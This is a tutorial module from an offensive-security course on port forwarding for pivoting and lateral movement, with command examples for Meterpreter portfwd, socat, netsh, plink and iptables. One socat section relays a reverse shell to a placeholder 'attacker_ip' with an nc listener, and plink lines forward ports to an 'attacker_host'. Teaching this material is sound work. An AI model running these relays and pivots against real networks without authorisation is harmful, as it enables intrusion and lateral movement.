# Port Forwarding

## Unit 9 - Topic 3 | Pivoting and Lateral Movement

---

## Overview

**Port forwarding** redirects network traffic from one port/host to another, enabling access to services through firewalls and network boundaries. Unlike full SOCKS proxies, port forwarding targets specific services and is lighter-weight.

---

## 1. Port Forwarding Methods

```
PORT FORWARDING OVERVIEW:

LOCAL FORWARD:
Attacker:LocalPort → Pivot → Target:RemotePort
"Make target's service available on my machine"

REMOTE FORWARD:
Pivot:RemotePort → Attacker:LocalPort
"Make my service available on the pivot"

RELAY/REDIRECT:
Any traffic hitting Pivot:Port → Target:Port
"Pivot acts as transparent proxy"

TOOLS:
├── SSH (-L, -R)          — Most common
├── Meterpreter portfwd   — During Metasploit sessions
├── socat                 — Versatile relay tool
├── netsh (Windows)       — Built-in Windows forwarding
├── iptables (Linux)      — Kernel-level forwarding
├── Chisel                — Modern tunneling tool
└── plink (PuTTY)         — Windows SSH port forward
```

---

## 2. Meterpreter Port Forwarding

```bash
# === METERPRETER PORTFWD ===
# After getting Meterpreter session:

# Forward local port to internal target:
meterpreter> portfwd add -l 8080 -p 80 -r 10.0.2.10
# localhost:8080 → 10.0.2.10:80

# Forward RDP:
meterpreter> portfwd add -l 3389 -p 3389 -r 10.0.2.10
# xfreerdp /v:127.0.0.1:3389

# Forward SMB:
meterpreter> portfwd add -l 445 -p 445 -r 10.0.2.10
# smbclient -L //127.0.0.1 -N

# List active forwards:
meterpreter> portfwd list
# 0: 127.0.0.1:8080 -> 10.0.2.10:80
# 1: 127.0.0.1:3389 -> 10.0.2.10:3389

# Remove a forward:
meterpreter> portfwd delete -l 8080 -p 80 -r 10.0.2.10

# Remove all:
meterpreter> portfwd flush
```

---

## 3. Socat (Versatile Relay)

```bash
# === SOCAT — Swiss Army Knife of Networking ===

# Simple port forward:
socat TCP-LISTEN:8080,fork TCP:10.0.2.10:80
# Listen on 8080, forward to 10.0.2.10:80

# Fork: Handle multiple connections simultaneously

# Forward with bind address:
socat TCP-LISTEN:8080,fork,bind=0.0.0.0 TCP:10.0.2.10:80
# Listen on all interfaces

# UDP forwarding:
socat UDP-LISTEN:53,fork UDP:10.0.2.1:53

# === SOCAT AS REVERSE SHELL RELAY ===
# On pivot (receives reverse shell, relays to attacker):
socat TCP-LISTEN:4444,fork TCP:attacker_ip:5555

# Attacker listens on 5555:
nc -nlvp 5555

# Target connects to pivot:4444 → relayed to attacker:5555

# === SOCAT ENCRYPTED TUNNEL ===
# Generate certificate:
openssl req -newkey rsa:2048 -nodes -keyout key.pem \
  -x509 -days 365 -out cert.pem
cat key.pem cert.pem > bind.pem

# Encrypted listener:
socat OPENSSL-LISTEN:443,cert=bind.pem,fork TCP:10.0.2.10:80

# Encrypted client:
socat TCP-LISTEN:8080,fork OPENSSL:pivot:443,verify=0
```

---

## 4. Windows Port Forwarding

```powershell
# === NETSH (Built-in Windows) ===
# Requires admin privileges

# Add port forward:
netsh interface portproxy add v4tov4 `
  listenport=8080 listenaddress=0.0.0.0 `
  connectport=80 connectaddress=10.0.2.10

# List forwards:
netsh interface portproxy show all

# Remove forward:
netsh interface portproxy delete v4tov4 `
  listenport=8080 listenaddress=0.0.0.0

# === PLINK (PuTTY SSH) ===
# Windows equivalent of SSH tunneling:
plink.exe -ssh -L 8080:10.0.2.10:80 user@pivot_host
plink.exe -ssh -D 1080 user@pivot_host
plink.exe -ssh -R 9090:localhost:3389 user@attacker_host

# Non-interactive (for scripts):
echo y | plink.exe -ssh -l user -pw password \
  -L 8080:10.0.2.10:80 pivot_host
```

---

## 5. Linux Kernel Port Forwarding

```bash
# === IPTABLES PORT FORWARDING ===
# Enable IP forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward

# Forward incoming port 8080 to internal host:
iptables -t nat -A PREROUTING -p tcp --dport 8080 \
  -j DNAT --to-destination 10.0.2.10:80

# Masquerade outgoing:
iptables -t nat -A POSTROUTING -j MASQUERADE

# Allow forwarding:
iptables -A FORWARD -p tcp -d 10.0.2.10 --dport 80 -j ACCEPT

# === RINETD (Simple Port Redirector) ===
# /etc/rinetd.conf:
# bindaddress bindport connectaddress connectport
# 0.0.0.0 8080 10.0.2.10 80
# 0.0.0.0 3389 10.0.2.20 3389

sudo rinetd
```

---

## Summary Table

| Tool | Platform | Best For |
|------|----------|---------|
| **SSH -L/-R** | Linux/Mac | Encrypted port forward |
| **Meterpreter portfwd** | Any (via Metasploit) | During exploitation |
| **socat** | Linux | Versatile relay, encryption |
| **netsh** | Windows | Built-in, no tools needed |
| **plink** | Windows | SSH tunneling on Windows |
| **iptables** | Linux | Kernel-level forwarding |

---

## Quick Revision Questions

1. **How do you forward RDP through a Meterpreter session?**
2. **What is socat and when would you use it over SSH?**
3. **How does netsh portproxy work on Windows?**
4. **What is the difference between port forwarding and SOCKS proxy?**
5. **How do you create an encrypted relay with socat?**

---

[← Previous: SSH Tunneling](02-ssh-tunneling.md) | [Next: SOCKS Proxies →](04-socks-proxies.md)

---

*Unit 9 - Topic 3 of 6 | [Back to README](../README.md)*
